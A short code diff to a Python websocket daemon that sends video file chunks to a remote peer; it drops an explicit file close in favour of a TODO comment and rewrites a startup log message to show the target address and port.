@@ -37,7 +37,7 @@ async def ContinuouslyVideoClip(ws:ClientConnection):
             ]
             while frame := f.read1(CHUNK_SIZE):
                 buffer.append(frame)
-            f.close()
+        # TODO this is some incompetent buffer system
 
         await Sender.send_large_buffer(buffer, tag=ProtoTags.RECV_FILE)
 
@@ -61,7 +61,7 @@ async def ContinuouslyVideoClip(ws:ClientConnection):
 
 
 async def DaemonMain():
-    log("Starting WS Daemon...")
+    log(f"Websockets connection attempt to {target_ip}:{port} as daemon...")
 
     async def hooks(websocket):
         # print('Hooked!')
